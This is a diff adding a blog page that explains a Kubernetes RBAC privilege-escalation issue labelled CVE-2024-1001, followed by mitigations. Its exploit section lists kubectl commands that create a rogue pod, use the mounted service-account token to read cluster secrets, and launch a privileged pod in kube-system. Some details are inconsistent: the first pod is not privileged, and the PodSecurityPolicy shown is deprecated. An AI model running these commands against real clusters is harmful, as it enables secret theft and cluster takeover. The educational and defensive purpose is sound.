@@ -1,0 +1,151 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>CVE-2024-1001 — Hem Parekh</title>
+<meta name="description" content="CVE-2024-1001" />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Newsreader:ital,opsz,wght@0,6..72,400;0,6..72,500;1,6..72,400&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="../style.css" />
+</head>
+<body>
+<nav>
+  <div class="wrap">
+    <a href="../index.html" class="name">hem parekh</a>
+    <div class="links">
+      <a href="../findings.html">Findings</a>
+      <a href="../projects.html">Projects</a>
+      <a href="../writing.html" class="active">Writing</a>
+      <a href="../about.html">About</a>
+      <a href="mailto:hemparekh1596@gmail.com">Contact</a>
+    </div>
+  </div>
+</nav>
+<article class="article wrap">
+  <a class="back" href="../writing.html">← Writing</a>
+  <div class="amTag">CVE</div>
+  <h1>CVE-2024-1001</h1>
+  <div class="ameta">Sep 8, 2024 &middot; 3 min read</div>
+  <div class="prose">
+<h2>What is CVE-2024–1001?</h2>
+<p>
+          Kubernetes relies heavily on Role-Based Access Control (RBAC) to manage permissions. However, in early 2024, CVE-2024–1001 was disclosed, revealing how misconfigured RBAC rules in Kubernetes could allow attackers to gain full control over a cluster. This vulnerability emphasizes the risks of poorly defined access policies.
+        </p>
+<h3>RBAC in Kubernetes</h3>
+<p>
+          RBAC allows administrators to define who can access resources in a Kubernetes cluster and what actions they can perform. Permissions are granted using Roles, Cluster Roles, and Role Bindings.
+        </p>
+<h2>The Vulnerability</h2>
+<p>
+          CVE-2024–1001 occurs when overly permissive RBAC configurations allow attackers to escalate privileges. Specifically:
+        </p>
+<ul>
+<li>Permissions like “create” or “patch” on sensitive resources (e.g., Pods) can be abused.</li>
+<li>Attackers can deploy malicious workloads, extract secrets, or control the cluster API server.</li>
+</ul>
+<h2>Exploit Workflow</h2>
+<h3>RBAC Misconfiguration</h3>
+<div class="code-block">
+<code>
+apiVersion: rbac.authorization.k8s.io/v1<br/>
+kind: Role<br/>
+metadata:<br/>
+  namespace: vulnerable-namespace<br/>
+  name: overly-permissive-role<br/>
+rules:<br/>
+- apiGroups: [""]<br/>
+  resources: ["pods", "secrets"]<br/>
+  verbs: ["get", "create", "patch"]<br/>
+</code>
+</div>
+<p>This Role allows anyone bound to it to create and patch Pods and access secrets in the namespace.</p>
+<h3>Step-by-Step Exploit</h3>
+<ol>
+<li><strong>Gain Initial Access:</strong> Assume the attacker has access to a low-privileged service account in the namespace, bound to the misconfigured Role.</li>
+<li><strong>Create a Malicious Pod:</strong> Use the <code>kubectl</code> command to create a Pod with elevated privileges:
+            <div class="code-block">
+<code>
+kubectl run malicious-pod --image=alpine --restart=Never -- /bin/sh -c "apk add curl; while true; do sleep 3600; done"
+              </code>
+</div>
+</li>
+<li><strong>Access Sensitive Secrets:</strong> Once the Pod is running, exec into it:
+            <div class="code-block">
+<code>
+kubectl exec -it malicious-pod -- /bin/sh<br/>
+# Inside the Pod:<br/>
+curl -s -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \ <br/>
+https://kubernetes.default.svc/api/v1/namespaces/vulnerable-namespace/secrets
+              </code>
+</div>
+</li>
+<li><strong>Escalate Privileges:</strong> Create Pods with privileged containers:
+            <div class="code-block">
+<code>
+kubectl apply -f - &lt;<eof<br>
+apiVersion: v1<br/>
+kind: Pod<br/>
+metadata:<br/>
+  name: root-access-pod<br/>
+  namespace: kube-system<br/>
+spec:<br/>
+  containers:<br/>
+  - name: root-access-container<br/>
+    image: alpine<br/>
+    securityContext:<br/>
+      privileged: true<br/>
+    command: ["/bin/sh", "-c", "while true; do sleep 3600; done"]<br/>
+EOF
+              </eof<br></code>
+</div>
+</li>
+</ol>
+<h2>Mitigation Strategies</h2>
+<ol>
+<li><strong>Enforce the Principle of Least Privilege:</strong> Grant only the minimum permissions necessary for users and service accounts to perform their tasks. Avoid broad permissions like “create” or “patch” on sensitive resources.</li>
+<li><strong>Audit RBAC Policies:</strong> Regularly audit your RBAC configurations to identify overly permissive Roles and ClusterRoles:
+            <div class="code-block">
+<code>
+kubectl get roles,clusterroles,rolebindings,clusterrolebindings --all-namespaces
+              </code>
+</div>
+</li>
+<li><strong>Use Pod Security Standards:</strong> Apply Pod Security Standards (PSS) to restrict privileged Pod creation:
+            <div class="code-block">
+<code>
+apiVersion: policy/v1beta1<br/>
+kind: PodSecurityPolicy<br/>
+metadata:<br/>
+  name: restricted<br/>
+spec:<br/>
+  privileged: false
+              </code>
+</div>
+</li>
+<li><strong>Enable Logging and Monitoring:</strong> Monitor for suspicious activities, such as unauthorized Pod creation or access to secrets. Tools like Falco or Kubernetes Audit Logs can help.</li>
+<li><strong>Use Network Policies:</strong> Restrict Pod-to-Pod communication using Kubernetes Network Policies to limit the attack surface.</li>
+</ol>
+<h2>Conclusion</h2>
+<p>
+          CVE-2024–1001 underscores the importance of careful RBAC configuration in Kubernetes. Misconfigured permissions can open the door to attackers, allowing them to escalate privileges and take over a cluster. By enforcing least privilege, auditing RBAC policies, and using Pod Security Standards, organizations can safeguard their Kubernetes environments.
+        </p>
+  </div>
+  <a class="back" style="margin-top:48px;display:inline-block" href="../writing.html">← All writing</a>
+</article>
+<footer class="wrap">
+  <h2>Have a bug, a role, or a hard parser to read? Get in touch.</h2>
+  <div class="links">
+    <a href="mailto:hemparekh1596@gmail.com">hemparekh1596@gmail.com</a>
+    <a href="https://github.com/Hem1700" target="_blank" rel="noopener">github</a>
+    <a href="https://linkedin.com/in/hem-parekh" target="_blank" rel="noopener">linkedin</a>
+  </div>
+  <div class="fine">&copy; 2026 Hem Parekh</div>
+</footer>
+<script>
+  const io=new IntersectionObserver((es)=>{es.forEach(e=>{if(e.isIntersecting){e.target.classList.add("in");io.unobserve(e.target)}})},{threshold:.12});
+  document.querySelectorAll(".reveal").forEach(el=>io.observe(el));
+</script>
+</body>
+</html>
